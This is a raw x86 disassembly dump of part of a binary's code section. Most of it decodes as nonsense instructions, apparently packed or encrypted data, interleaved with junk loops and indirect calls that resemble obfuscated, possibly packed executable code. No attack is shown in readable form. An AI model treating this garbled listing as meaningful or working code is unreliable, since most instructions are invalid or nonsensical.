  40af52:	fiadd  DWORD PTR [ecx-0x44]
  40af55:	cmc    
  40af56:	cmp    DWORD PTR [edx+0x9019a0e],eax
  40af5c:	popf   
  40af5d:	xchg   esi,eax
  40af5e:	push   edx
  40af5f:	(bad)  
  40af60:	ja     0x40af24
  40af62:	add    ebp,DWORD PTR [ebx-0x579771ae]
  40af68:	mov    bl,0xa3
  40af6a:	fnsave [edx]
  40af6c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40af6d:	inc    esp
  40af6e:	es clc 
  40af70:	pop    esp
  40af71:	ret    
  40af72:	in     al,dx
  40af73:	in     eax,0x6d
  40af75:	mov    ah,0xe9
  40af77:	push   ebp
  40af78:	ss jns 0x40af68
  40af7b:	xchg   edi,eax
  40af7c:	pop    es
  40af7d:	fst    QWORD PTR [edx-0x68]
  40af80:	inc    ecx
  40af81:	in     eax,0x92
  40af83:	cwde   
  40af84:	pushf  
  40af85:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40af86:	(bad)  [esi-0x4d3a48ae]
  40af8c:	lahf   
  40af8d:	imul   ecx,ebp,0x6f0713f
  40af93:	lea    ecx,[ecx+0x6b]
  40af96:	out    0x1e,eax
  40af98:	xor    al,0x6d
  40af9a:	sbb    BYTE PTR [ebp-0x9],dl
  40af9d:	cld    
  40af9e:	lods   eax,DWORD PTR ds:[esi]
  40af9f:	cmp    al,0xee
  40afa1:	mov    cs,WORD PTR [edx+0x2d962e36]
  40afa7:	jge    0x40af6b
  40afa9:	adc    eax,0xd20eb246
  40afae:	and    al,0x9e
  40afb0:	sub    al,0xa3
  40afb2:	mov    eax,?
  40afb4:	cdq    
  40afb5:	(bad)  
  40afb7:	test   ah,dl
  40afb9:	adc    BYTE PTR [edi],bh
  40afbb:	add    eax,0x46d2dac9
  40afc0:	and    BYTE PTR [ebp+ebx*2+0xc],ch
  40afc4:	push   esp
  40afc5:	xchg   ecx,eax
  40afc6:	pop    ecx
  40afc7:	pop    ecx
  40afc8:	xchg   esp,eax
  40afc9:	fdiv   QWORD PTR [eax+0x2b]
  40afcc:	cli    
  40afcd:	out    dx,eax
  40afce:	fisttp WORD PTR [ebx]
  40afd0:	sbb    DWORD PTR [eax-0xc],0x21
  40afd4:	and    al,0xc8
  40afd6:	ret    0xd571
  40afd9:	xor    al,0x3c
  40afdb:	mov    cl,0xb3
  40afdd:	xchg   ebp,eax
  40afde:	or     dl,ah
  40afe0:	xchg   ebp,eax
  40afe1:	ffreep st(0)
  40afe3:	cwde   
  40afe4:	iret   
  40afe5:	push   ds
  40afe6:	les    esi,FWORD PTR [eax-0x5e]
  40afe9:	es (bad) 
  40afeb:	clc    
  40afec:	inc    esi
  40afed:	aam    0x10
  40afef:	sub    eax,0xa550a53e
  40aff4:	sbb    BYTE PTR [edi+0x5a2aec03],dl
  40affa:	lods   eax,DWORD PTR ds:[esi]
  40affb:	call   DWORD PTR [ebp+0x21]
  40affe:	jmp    0x40af9c
  40b000:	mov    esi,DWORD PTR [esp+ebx*1+0x30c0be30]
  40b007:	pop    ebx
  40b008:	lds    edx,FWORD PTR [esi+0x7e8bd118]
  40b00e:	or     eax,DWORD PTR [ecx]
  40b010:	sub    edi,DWORD PTR [edx-0x26]
  40b013:	imul   edx,DWORD PTR [ebp+0x1d3030e2],0xfffffff4
  40b01a:	sub    eax,ecx
  40b01c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b01d:	mov    WORD PTR [ecx-0x1b],ss
  40b020:	cs (bad) gs:[ebx]
  40b024:	bound  ecx,QWORD PTR [ebp-0x25]
  40b027:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b028:	cmp    ebx,DWORD PTR [ecx+0x61]
  40b02b:	gs push esp
  40b02d:	cmp    DWORD PTR [eax],0x59aad65e
  40b033:	pop    ss
  40b034:	push   0x36
  40b036:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b037:	in     eax,0x16
  40b039:	nop
  40b03a:	clc    
  40b03b:	out    0x13,eax
  40b03d:	stc    
  40b03e:	jge    0x40b026
  40b040:	push   esi
  40b041:	pushf  
  40b042:	mov    ecx,0x418f4595
  40b047:	jmp    0xc05f453d
  40b04c:	test   BYTE PTR [ebp+0x2d],bl
  40b04f:	das    
  40b050:	sub    eax,0xd3ac0939
  40b055:	jb     0x40b019
  40b057:	cmp    ebx,ebp
  40b059:	je     0x40b0b0
  40b05b:	in     eax,0x63
  40b05d:	out    0x28,al
  40b05f:	pop    ecx
  40b060:	rol    DWORD PTR [ebx],cl
  40b062:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b063:	adc    DWORD PTR [ecx-0x45],ebp
  40b066:	mov    WORD PTR [edi+edi*2-0x6ea7563e],ss
  40b06d:	dec    edx
  40b06e:	in     al,0xbe
  40b070:	scas   eax,DWORD PTR es:[edi]
  40b071:	ficom  WORD PTR ds:0x629aa5b3
  40b077:	fdiv   DWORD PTR [eax]
  40b079:	cdq    
  40b07a:	shl    DWORD PTR [ebp-0x6c6375d2],cl
  40b080:	pop    ds
  40b081:	popa   
  40b082:	mov    eax,ds:0x99c6df5
  40b087:	jae    0x40b075
  40b089:	sbb    ecx,ebp
  40b08b:	das    
  40b08c:	pop    esi
  40b08d:	jno    0x40b073
  40b08f:	xlat   BYTE PTR ds:[ebx]
  40b090:	inc    DWORD PTR [edi-0x6a]
  40b093:	mov    ss,WORD PTR [ebx]
  40b095:	or     BYTE PTR [edi+0x49d395e9],cl
  40b09b:	fwait
  40b09c:	xor    eax,edx
  40b09e:	xor    esi,edx
  40b0a0:	add    eax,ecx
  40b0a2:	add    esi,ecx
  40b0a4:	imul   eax,esi
  40b0a7:	mov    esi,DWORD PTR [ebp+0xc]
  40b0aa:	cmp    esi,eax
  40b0ac:	mov    eax,DWORD PTR [ebp-0x4]
  40b0af:	je     0x40aa89
  40b0b5:	xor    eax,edx
  40b0b7:	add    eax,ecx
  40b0b9:	mov    ecx,DWORD PTR [ebp+0xc]
  40b0bc:	imul   eax,ecx
  40b0bf:	add    eax,DWORD PTR [ebp+0x8]
  40b0c2:	mov    DWORD PTR [ebp+0xc],eax
  40b0c5:	mov    eax,DWORD PTR [ebp+0xc]
  40b0c8:	jmp    0x40b2c3
  40b0cd:	fadd   QWORD PTR [edi-0x18]
  40b0d0:	(bad)  
  40b0d1:	ins    DWORD PTR es:[edi],dx
  40b0d2:	jns    0x40b0d0
  40b0d4:	pop    ebp
  40b0d5:	xchg   BYTE PTR [ebx+0xb],cl
  40b0d8:	xor    ah,BYTE PTR [ebx]
  40b0da:	ret    0x366f
  40b0dd:	popf   
  40b0de:	loop   0x40b15e
  40b0e0:	jle    0x40b13e
  40b0e2:	jg     0x40b162
  40b0e4:	jle    0x40b145
  40b0e6:	mov    ch,0x87
  40b0e8:	outs   dx,BYTE PTR ds:[esi]
  40b0e9:	mov    al,0x24
  40b0eb:	dec    eax
  40b0ec:	mov    ebp,ss
  40b0ee:	sub    eax,0xbd94bd10
  40b0f3:	xor    ebx,ecx
  40b0f5:	dec    esi
  40b0f6:	fwait
  40b0f7:	retf   0x98d
  40b0fa:	push   eax
  40b0fb:	cwde   
  40b0fc:	pop    es
  40b0fd:	rcr    BYTE PTR [esi+0x67],0x3e
  40b101:	popf   
  40b102:	xchg   ebp,eax
  40b103:	stc    
  40b104:	sahf   
  40b105:	rcl    BYTE PTR [eax],cl
  40b107:	repnz nop
  40b109:	ret    
  40b10a:	cs stc 
  40b10c:	push   ss
  40b10d:	xor    esp,esi
  40b10f:	scas   eax,DWORD PTR es:[edi]
  40b110:	jmp    0xbac031ee
  40b115:	xchg   ecx,ebx
  40b117:	test   eax,0x65384286
  40b11c:	fld    st(1)
  40b11e:	mov    dl,0x94
  40b120:	dec    edi
  40b121:	xor    al,0xc7
  40b123:	mov    ds,WORD PTR [edx]
  40b125:	xchg   ebp,eax
  40b126:	push   esp
  40b127:	adc    al,0x61
  40b129:	mov    dl,0x19
  40b12b:	dec    esp
  40b12c:	fmul   DWORD PTR [ebp+0x57]
  40b12f:	mov    bl,0xc
  40b131:	ret    
  40b132:	sub    al,0x58
  40b134:	sbb    al,0x95
  40b136:	mov    edx,0xc58fd89
  40b13b:	sbb    eax,0xc8e1df91
  40b140:	xor    ah,bl
  40b142:	xchg   ebp,eax
  40b143:	adc    dl,dh
  40b145:	std    
  40b146:	push   eax
  40b147:	sub    edx,edx
  40b149:	cli    
  40b14a:	cmc    
  40b14b:	cmp    BYTE PTR [edi],cl
  40b14d:	jno    0x40b123
  40b14f:	rol    DWORD PTR [esi],0x2d
  40b152:	icebp  
  40b153:	inc    edi
  40b154:	fcmovbe st,st(2)
  40b156:	mov    eax,0xe8d42ab
  40b15b:	scas   eax,DWORD PTR es:[edi]
  40b15c:	cmp    eax,0x8d996ef
  40b161:	or     dh,BYTE PTR [esi-0x6c]
  40b164:	ss inc edx
  40b166:	fmulp  st(4),st
  40b168:	jl     0x40b14b
  40b16a:	xchg   edi,eax
  40b16b:	xchg   ebp,eax
  40b16d:	fnstcw WORD PTR [esi-0xaee9d5a]
  40b173:	mov    ss,WORD PTR [ebx+0x62]
  40b176:	ins    BYTE PTR es:[edi],dx
  40b177:	push   cs
  40b178:	xchg   ebx,eax
  40b179:	sub    BYTE PTR [ebx+0x4a],0xbf
  40b17d:	push   cs
  40b17e:	sub    al,0xb8
  40b180:	in     eax,dx
  40b181:	mov    gs,WORD PTR [edi]
  40b183:	adc    edx,DWORD PTR [edx-0x1cbb26b7]
  40b189:	and    edx,esp
  40b18b:	fwait
  40b18c:	cmc    
  40b18d:	rcr    DWORD PTR [esp+ebp*1+0x20d8afb4],0xe6
  40b195:	dec    ebx
  40b196:	add    al,0x94
  40b198:	jae    0x40b16e
  40b19a:	mov    BYTE PTR [edi-0x570718a1],ch
  40b1a0:	and    BYTE PTR [ecx+0x58],dl
  40b1a3:	mov    BYTE PTR [ecx+eax*8],dh
  40b1a6:	mov    ebp,edx
  40b1a8:	push   ds
  40b1a9:	mov    WORD PTR [ecx+0x58],cs
  40b1ac:	mov    esp,0x4e8d38d9
  40b1b1:	jp     0x40b14d
  40b1b3:	out    dx,eax
  40b1b4:	in     al,0xe8
  40b1b6:	add    BYTE PTR [ebp+0x6793e75c],cl
  40b1bc:	rcr    BYTE PTR [eax],1
  40b1be:	xchg   esp,eax
  40b1bf:	dec    ebp
  40b1c0:	fbstp  TBYTE PTR [esi]
  40b1c2:	sub    dl,BYTE PTR [ecx+0x2b]
  40b1c5:	mov    eax,0xa5311a19
  40b1ca:	(bad)  [edi]
  40b1cc:	mov    BYTE PTR [edx+edi*1-0x10],dh
  40b1d0:	cli    
  40b1d1:	fsub   QWORD PTR [edi+edx*8-0x69c48491]
  40b1d8:	mov    ecx,0xf73c688b
  40b1dd:	outs   dx,BYTE PTR ds:[esi]
  40b1de:	and    edi,edi
  40b1e0:	dec    edi
  40b1e1:	mov    ds:0x99ea07e7,al
  40b1e6:	push   ss
  40b1e7:	mov    al,ds:0xfff2019a
  40b1ec:	jmp    0x742e:0x2af6cce9
  40b1f3:	arpl   WORD PTR es:[ebp+0x22ee7a9f],dx
  40b1fa:	cmp    eax,0x92fedd9a
  40b1ff:	cli    
  40b200:	loopne 0x40b1bb
  40b202:	mov    cl,0x99
  40b204:	pop    esi
  40b205:	jge    0x40b254
  40b207:	repnz test BYTE PTR [ebx+ebx*2],ah
  40b20b:	dec    ebx
  40b20c:	inc    edi
  40b20d:	mov    ch,0x9e
  40b20f:	add    bh,0xe2
  40b212:	clc    
  40b213:	adc    cl,BYTE PTR [edx]
  40b215:	neg    DWORD PTR [edx]
  40b217:	xchg   BYTE PTR [edi-0x47],bh
  40b21a:	lahf   
  40b21b:	inc    ebx
  40b21c:	cmp    cl,ah
  40b21e:	imul   ecx,DWORD PTR [ecx+ebp*8],0x3a18a8b9
  40b225:	adc    DWORD PTR es:[eax],edi
  40b228:	xor    BYTE PTR [edi+0x2e],dh
  40b22b:	mov    eax,DWORD PTR [eax-0x3f]
  40b22e:	mov    al,cl
  40b230:	retf   
  40b231:	test   DWORD PTR [eax],esp
  40b233:	mov    ecx,0xfb5fdbc
  40b238:	ret    
  40b239:	mov    al,0xf0
  40b23b:	out    0x1a,al
  40b23d:	sahf   
  40b23e:	sub    DWORD PTR [ecx-0x48],0x6101e305
  40b245:	dec    ecx
  40b246:	cdq    
  40b247:	les    ecx,FWORD PTR [edi]
  40b249:	jnp    0x40b27d
  40b24b:	hlt    
  40b24c:	lahf   
  40b24d:	aas    
  40b24e:	lods   eax,DWORD PTR ds:[esi]
  40b24f:	sti    
  40b250:	mov    ecx,0xd5c83a99
  40b255:	add    dl,BYTE PTR ds:[eax]
  40b258:	cs or  DWORD PTR fs:[eax],0xffffff9d
  40b25d:	mov    eax,0x1a3300fc
  40b262:	or     edx,0x6f
  40b265:	mov    edi,0x5c47dcc8
  40b26a:	mov    bh,0x65
  40b26c:	jle    0x40b2a2
  40b26e:	jle    0x40b2d4
  40b270:	shl    BYTE PTR [edi+0x4894762e],1
  40b276:	addr16 add esp,esp
  40b279:	fwait
  40b27a:	in     al,0x2c
  40b27c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b27d:	test   eax,0x6c114cb4
  40b282:	adc    DWORD PTR [edi+edx*8+0x24f3a1d4],0xffffffaa
  40b28a:	(bad)  
  40b28b:	call   FWORD PTR [eax+0x61c237fc]
  40b291:	push   edi
  40b292:	bound  ecx,QWORD PTR [esi]
  40b294:	shl    DWORD PTR [ecx-0x5],cl
  40b297:	cmp    eax,0xec74b770
  40b29c:	xchg   DWORD PTR [esi],ecx
  40b29e:	push   es
  40b29f:	aaa    
  40b2a0:	ins    BYTE PTR es:[edi],dx
  40b2a1:	rol    DWORD PTR [ecx],0xd1
  40b2a4:	xor    ecx,DWORD PTR [eax]
  40b2a6:	cmp    edx,edx
  40b2a8:	add    eax,0x8ca48086
  40b2ad:	inc    ebp
  40b2ae:	dec    ebp
  40b2af:	loopne 0x40b264
  40b2b1:	push   0xffffffeb
  40b2b3:	xor    al,0x7f
  40b2b5:	xchg   ecx,eax
  40b2b6:	mov    eax,ds:0x503de42
  40b2bb:	pslld  mm3,QWORD PTR [ebx+0x20]
  40b2bf:	ror    bl,0xb4
  40b2c2:	outs   dx,BYTE PTR ds:[esi]
  40b2c3:	pop    esi
  40b2c4:	leave  
  40b2c5:	ret    0x8
  40b2c8:	push   ebp
  40b2c9:	mov    ebp,esp
  40b2cb:	sub    esp,0x30
  40b2ce:	mov    eax,ds:0x4305ee
  40b2d3:	mov    ecx,DWORD PTR ds:0x4305fa
  40b2d9:	sub    ecx,eax
  40b2db:	imul   eax,DWORD PTR [eax+ecx*1]
  40b2df:	jmp    0x40b43d
  40b2e4:	adc    eax,0x6533e552
  40b2e9:	inc    ebp
  40b2ea:	and    eax,0x241ce54
  40b2ef:	scas   al,BYTE PTR es:[edi]
  40b2f0:	push   DWORD PTR [ecx+0x3f]
  40b2f3:	dec    eax
  40b2f4:	sti    
  40b2f5:	in     al,0x7e
  40b2f7:	jle    0x40b338
  40b2f9:	jg     0x40b379
  40b2fb:	jle    0x40b2da
  40b2fd:	push   ebp
  40b2fe:	mov    edx,0x5379aa2b
  40b303:	push   0x76
  40b305:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b306:	cs ins DWORD PTR es:[edi],dx
  40b308:	add    dh,dl
  40b30a:	add    eax,0xc9479076
  40b30f:	ror    BYTE PTR [ebp-0x45],cl
  40b312:	mov    cl,0xe5
  40b314:	mov    al,0xdd
  40b316:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b317:	mov    ds:0x847cc82a,eax
  40b31c:	pop    ebx
  40b31d:	cmp    ecx,esi
  40b31f:	(bad)  
  40b320:	nop
  40b321:	add    eax,DWORD PTR [ecx+ebx*8]
  40b324:	sub    eax,0xb0a26c8a
  40b329:	pop    ebp
  40b32a:	cmp    cl,BYTE PTR ds:0xcd613401
  40b330:	mov    eax,ds:0x5ff99e39
  40b335:	cmp    eax,0xb114a68
  40b33a:	xchg   esp,eax
  40b33b:	push   ecx
  40b33c:	imul   eax,ebx,0xbf91ae44
  40b342:	in     eax,0x9c
  40b344:	inc    ebp
  40b345:	inc    ecx
  40b346:	pop    es
  40b347:	cmp    BYTE PTR [ebx+ecx*1],bl
  40b34a:	jg     0x40b33d
  40b34c:	fld    DWORD PTR [edx+ecx*8]
  40b34f:	mov    ecx,DWORD PTR [ebp*8+0x1a0c1162]
  40b356:	cmc    
  40b357:	cwde   
  40b358:	les    edi,FWORD PTR [ebp-0x5c3c0a31]
  40b35e:	test   DWORD PTR [ecx],esp
  40b360:	in     al,0x7c
  40b362:	push   eax
  40b363:	sbb    eax,0x22600601
  40b368:	sbb    al,0x44
  40b36a:	ficom  WORD PTR [edx-0x7d]
  40b36d:	xor    dh,bl
  40b36f:	shr    BYTE PTR [esp+edi*4],cl
  40b372:	pop    edx
  40b373:	push   0xffffffb2
  40b375:	scas   eax,DWORD PTR es:[edi]
  40b376:	in     eax,0x27
  40b378:	(bad)  
  40b379:	fcom   DWORD PTR [ecx-0x7b]
  40b37c:	fisubr DWORD PTR [ecx+0x25]
  40b37f:	pop    esp
  40b380:	mov    ebx,0x329fe87
  40b385:	jp     0x40b38a
  40b387:	ficom  DWORD PTR [eax+0x4b]
  40b38a:	mov    cl,BYTE PTR [ecx+0xc]
  40b38d:	lock mov bx,WORD PTR [eax-0xa96fbdd]
  40b395:	scas   eax,DWORD PTR es:[edi]
  40b396:	bound  esp,QWORD PTR [edx]
  40b398:	iret   
  40b399:	fidivr WORD PTR [edx+ebp*1]
  40b39c:	neg    ebx
  40b39e:	in     al,0xaa
  40b3a0:	rcr    DWORD PTR [eax+ebp*8+0x0],1
  40b3a4:	xor    esp,DWORD PTR [ebx]
  40b3a6:	mov    bh,0xa8
  40b3a8:	fist   DWORD PTR [ebx+ebp*8]
  40b3ab:	and    ebp,esp
  40b3ad:	fcomp  DWORD PTR [eax-0x14a22746]
  40b3b3:	sub    eax,0x33377b7
  40b3b8:	adc    ch,0xc
  40b3bb:	mov    ah,0x92
  40b3bd:	push   edi
  40b3be:	(bad)  
  40b3bf:	stc    
  40b3c0:	sub    eax,ebx
  40b3c2:	xchg   edx,eax
  40b3c3:	inc    esp
  40b3c4:	and    al,0x90
  40b3c6:	and    BYTE PTR [esi+edi*8-0x70],cl
  40b3ca:	xchg   ecx,eax
  40b3cb:	sti    
  40b3cc:	inc    edi
  40b3cd:	mov    bh,0x14
  40b3cf:	xchg   ecx,eax
  40b3d0:	pop    es
  40b3d1:	shl    DWORD PTR [eax],1
  40b3d3:	retf   
  40b3d4:	stos   BYTE PTR es:[edi],al
  40b3d5:	popf   
  40b3d6:	fs scas al,BYTE PTR es:[edi]
  40b3d8:	xchg   edi,eax
  40b3d9:	rcr    BYTE PTR [ebp+eax*1-0x48],0x65
  40b3de:	xchg   edx,eax
  40b3df:	mov    bh,0x81
  40b3e1:	push   ss
  40b3e2:	into   
  40b3e3:	jmp    0xe19:0x6cd16fae
  40b3ea:	int    0x49
  40b3ec:	es ins BYTE PTR es:[edi],dx
  40b3ee:	xchg   edx,eax
  40b3ef:	jg     0x40b3a9
  40b3f1:	pop    edi
  40b3f2:	mov    fs,WORD PTR [esi]
  40b3f4:	push   es
  40b3f5:	repnz lods al,BYTE PTR ds:[esi]
  40b3f7:	pop    ecx
  40b3f8:	sti    
  40b3f9:	xchg   dh,ah
  40b3fb:	lahf   
  40b3fc:	fisub  WORD PTR ds:0x9a322479
  40b402:	mov    al,0x93
  40b404:	adc    dl,BYTE PTR [edi-0x3a2bfb43]
  40b40a:	sbb    al,0x54
  40b40c:	aad    0x62
  40b40e:	retf   
  40b40f:	mov    DWORD PTR [edx+0x72a41dfd],0x19af75a3
  40b419:	mov    WORD PTR [ebx],ss
  40b41b:	(bad)  
  40b41c:	ins    DWORD PTR es:[edi],dx
  40b41d:	shl    DWORD PTR ds:0xcf0d1aee,0xdb
  40b424:	test   al,0xe1
  40b426:	push   edi
  40b427:	sahf   
  40b428:	jmp    0x1b95a031
  40b42d:	ja     0x40b495
  40b42f:	pop    ds
  40b430:	or     eax,0xcc9f56c1
  40b435:	lods   eax,DWORD PTR ds:[esi]
  40b436:	retf   
  40b437:	bound  ebx,QWORD PTR cs:[esi]
  40b43a:	jle    0x40b3f2
  40b43c:	xchg   ecx,eax
  40b43d:	mov    DWORD PTR [ebp-0x4],0xf89c8535
  40b444:	mov    DWORD PTR ds:0x4305ce,0x11
  40b44e:	cmp    DWORD PTR ds:0x4305ce,0x0
  40b455:	je     0x40b489
  40b45b:	cmp    DWORD PTR ds:0x4305ce,0x19
  40b462:	jne    0x40b479
  40b468:	push   DWORD PTR [ebp-0x24]
  40b46b:	push   DWORD PTR [ebp-0x20]
  40b46e:	push   0x41ff
  40b473:	call   DWORD PTR ds:0x42eb68
  40b479:	mov    eax,ds:0x4305ce
  40b47e:	dec    eax
  40b47f:	mov    ds:0x4305ce,eax
  40b484:	jmp    0x40b44e
  40b489:	mov    DWORD PTR [ebp-0x18],0xf89c8532
  40b490:	or     eax,0x1c5c
  40b495:	mov    ecx,DWORD PTR [ebp-0x4]
  40b498:	push   ebx
  40b499:	add    DWORD PTR ds:0x43052e,edi
  40b49f:	mov    eax,0x7510856
  40b4a4:	mov    ebx,DWORD PTR ds:0x4305c2
  40b4aa:	sbb    DWORD PTR ds:0x42e7e2,ebx
  40b4b0:	xor    ecx,eax
  40b4b2:	mov    ebx,DWORD PTR ds:0x42ee94
  40b4b8:	sub    DWORD PTR ds:0x43050e,ebx
  40b4be:	mov    ebx,0x32729d
  40b4c3:	xor    DWORD PTR ds:0x4305c6,0xece
  40b4cd:	add    ecx,ebx
  40b4cf:	xor    DWORD PTR ds:0x430516,0x42e7ea
  40b4d9:	mov    DWORD PTR [ebp-0x1c],ecx
  40b4dc:	mov    ecx,DWORD PTR [ebp+0x14]
  40b4df:	xor    DWORD PTR ds:0x42ee9c,0x65f3
  40b4e9:	push   esi
  40b4ea:	sub    DWORD PTR ds:0x42e7e2,0x2022
  40b4f4:	push   edi
  40b4f5:	and    DWORD PTR ds:0x4305c6,0x430512
  40b4ff:	test   ecx,ecx
  40b501:	mov    DWORD PTR ds:0x42e7de,0x17b6
  40b50b:	je     0x40b58a
  40b511:	add    ecx,0x2345
  40b517:	mov    ecx,DWORD PTR [ebp+0x14]
  40b51a:	and    DWORD PTR ds:0x430526,0x0
  40b524:	jmp    0x40b536
  40b529:	mov    edi,DWORD PTR ds:0x430526
  40b52f:	inc    edi
  40b530:	mov    DWORD PTR ds:0x430526,edi
  40b536:	cmp    DWORD PTR ds:0x430526,0x1d
  40b53d:	jae    0x40b585
  40b543:	cmp    DWORD PTR ds:0x430526,0x4
  40b54a:	jne    0x40b560
  40b550:	push   0x42ee9c
  40b555:	push   0x6d9e
  40b55a:	call   DWORD PTR ds:0x42eb6c
  40b560:	cmp    DWORD PTR ds:0x430526,0x3
  40b567:	jne    0x40b57a
  40b56d:	mov    edi,DWORD PTR ds:0x430526
  40b573:	inc    edi
  40b574:	mov    DWORD PTR ds:0x430526,edi
  40b57a:	jmp    0x40b529
  40b57f:	and    esi,0x3dcd
  40b585:	mov    ecx,DWORD PTR [ecx]
  40b587:	mov    DWORD PTR [ebp-0x1c],ecx
  40b58a:	movzx  esi,BYTE PTR ds:0x430512
  40b591:	xor    DWORD PTR ds:0x43053a,esi
  40b597:	imul   edx,eax
  40b59a:	or     DWORD PTR ds:0x43053e,edx
  40b5a0:	mov    ecx,0x4573
  40b5a5:	xor    esi,DWORD PTR ds:0x430506
  40b5ab:	add    edx,ecx
  40b5ad:	mov    esi,0x7879
  40b5b2:	and    DWORD PTR ds:0x4305be,0x0
  40b5bc:	mov    edi,DWORD PTR ds:0x4305be
  40b5c2:	inc    edi
  40b5c3:	mov    DWORD PTR ds:0x4305be,edi
  40b5c9:	cmp    DWORD PTR ds:0x4305be,0x12
  40b5d0:	jne    0x40b5f7
  40b5d6:	push   0x1
  40b5d8:	push   0x3333
  40b5dd:	push   0x7164
  40b5e2:	push   0x26d7
  40b5e7:	push   0x1d14
  40b5ec:	push   0x64d6
  40b5f1:	call   DWORD PTR ds:0x42eb70
  40b5f7:	cmp    DWORD PTR ds:0x4305be,0x11
  40b5fe:	jne    0x40b613
  40b604:	xor    edi,edi
  40b606:	or     edi,DWORD PTR ds:0x4305be
  40b60c:	inc    edi
  40b60d:	mov    DWORD PTR ds:0x4305be,edi
  40b613:	cmp    DWORD PTR ds:0x4305be,0x1f
  40b61a:	jb     0x40b5bc
  40b620:	dec    edi
  40b621:	mov    edi,0x1556
  40b626:	xchg   esi,ecx
  40b628:	sub    edx,edi
  40b62a:	xor    esi,esi
  40b62c:	jmp    0x40b78a
  40b631:	mov    ch,dh
  40b633:	add    esi,DWORD PTR [eax+0x7b]
  40b636:	aad    0x9d
  40b638:	jl     0x40b646
  40b63a:	mov    eax,0x29914dc4
  40b63f:	cmp    al,0x4a
  40b641:	mov    esp,0x3f7e7ee5
  40b646:	jg     0x40b6c6
  40b648:	jle    0x40b6ba
  40b64a:	xchg   BYTE PTR [ebx],ch
  40b64c:	dec    eax
  40b64d:	xchg   edx,eax
  40b64e:	mov    bh,BYTE PTR [ebx+0x61a19033]
  40b654:	test   eax,0x21f8716d
  40b659:	xlat   BYTE PTR ds:[ebx]
  40b65a:	out    0xbf,eax
  40b65c:	and    esp,DWORD PTR [edi-0x30]
  40b65f:	push   es
  40b660:	mov    edi,0xd2b345e5
  40b665:	push   edi
  40b666:	pop    esi
  40b667:	in     al,0x5f
  40b669:	add    DWORD PTR [eax],edi
  40b66b:	scas   eax,DWORD PTR es:[edi]
  40b66c:	push   eax
  40b66d:	sub    cl,BYTE PTR [ebp+0x44db119c]
  40b673:	ja     0x40b69a
  40b675:	dec    ecx
  40b676:	mov    esi,0x5600c205
  40b67b:	jbe    0x40b698
  40b67d:	cwde   
  40b67e:	adc    eax,0xe9e99ea0
  40b683:	push   esi
  40b684:	jl     0x40b687
  40b686:	es inc esi
  40b688:	push   es
  40b689:	out    0x2d,al
  40b68b:	out    dx,eax
  40b68c:	cld    
  40b68d:	sbb    BYTE PTR [ecx],al
  40b68f:	lea    eax,[ecx+0x55151192]
  40b695:	ins    DWORD PTR es:[di],dx
  40b697:	std    
  40b698:	rcl    BYTE PTR [ecx-0x63],0xe3
  40b69c:	pop    esp
  40b69d:	pop    ebx
  40b69e:	call   DWORD PTR ds:0x1235f98c
  40b6a4:	outs   dx,DWORD PTR ds:[esi]
  40b6a5:	pop    ds
  40b6a6:	pop    edi
  40b6a7:	in     eax,dx
  40b6a8:	icebp  
  40b6a9:	jbe    0x40b67c
  40b6ab:	lods   eax,DWORD PTR ds:[esi]
  40b6ac:	popa   
  40b6ad:	es push ds
  40b6af:	sbb    DWORD PTR [edi],esp
  40b6b1:	cmp    DWORD PTR [esi],edi
  40b6b3:	mov    gs,WORD PTR [ebx]
  40b6b5:	sbb    al,0xbd
  40b6b7:	adc    al,0xb
  40b6b9:	jo     0x40b712
  40b6bb:	mov    bl,0xdb
  40b6bd:	jne    0x40b729
  40b6bf:	pop    esp
  40b6c0:	jge    0x40b683
  40b6c2:	call   0x4f73c7e
  40b6c7:	push   ebp
  40b6c8:	inc    ebp
  40b6c9:	and    eax,0x69d4bd90
  40b6ce:	mov    ch,0x95
  40b6d0:	ja     0x40b69c
  40b6d2:	add    al,0xdb
  40b6d4:	(bad)  
  40b6d5:	jmp    0x40b658
  40b6d7:	add    eax,0x3c143915
  40b6dc:	dec    edx
  40b6dd:	push   ss
  40b6de:	inc    esi
  40b6df:	mov    esi,0xc6ec95ef
  40b6e4:	mov    DWORD PTR [ebx],esp
  40b6e6:	mov    ch,BYTE PTR [esi-0x45]
  40b6e9:	arpl   WORD PTR [esi+ebx*2-0x43ce9499],di
  40b6f0:	scas   al,BYTE PTR es:[edi]
  40b6f1:	shl    BYTE PTR [edx-0x6d89355e],1
  40b6f7:	cmp    al,0x55
  40b6f9:	repnz mov al,ds:0xbd782eea
  40b6ff:	fsub   QWORD PTR [ebx-0x48217f78]
  40b705:	mov    al,ds:0x2f79789f
  40b70a:	pop    ebx
  40b70b:	ins    BYTE PTR es:[edi],dx
  40b70c:	sbb    ebp,ebp
  40b70e:	adc    eax,0xae4bd577
  40b713:	cmp    dh,bh
  40b715:	xor    DWORD PTR [eax+ebp*8],0x7d71cf31
  40b71c:	add    eax,DWORD PTR [eax-0x73fa9728]
  40b722:	adc    al,0xa3
  40b724:	jno    0x40b751
  40b726:	(bad)  
  40b727:	pop    ss
  40b728:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b729:	cmp    BYTE PTR [ebp+0x28],bl
  40b72c:	rcr    DWORD PTR [ecx],cl
  40b72e:	out    0xf3,al
  40b730:	cwde   
  40b731:	mov    edi,0x71100d4c
  40b737:	aaa    
  40b738:	adc    al,0xb6
  40b73a:	xchg   ebx,eax
  40b73b:	addr16 pop ecx
  40b73d:	inc    edi
  40b73e:	cdq    
  40b73f:	add    BYTE PTR [esi+0x2e1144da],ch
  40b745:	aam    0x68
  40b747:	repnz test BYTE PTR [ecx],cl
  40b74a:	and    al,0xa0
  40b74c:	aas    
  40b74d:	les    edi,FWORD PTR [edx]
  40b74f:	mov    esi,0x30bac95
  40b754:	and    eax,0xab2a3aa8
  40b759:	push   ss
  40b75a:	addr16 xchg esi,eax
  40b75c:	or     al,BYTE PTR [ecx]
  40b75e:	and    DWORD PTR [ecx],esi
  40b760:	js     0x40b75d
  40b762:	mov    al,0xae
  40b764:	xor    BYTE PTR [eax+0x28623a4f],dl
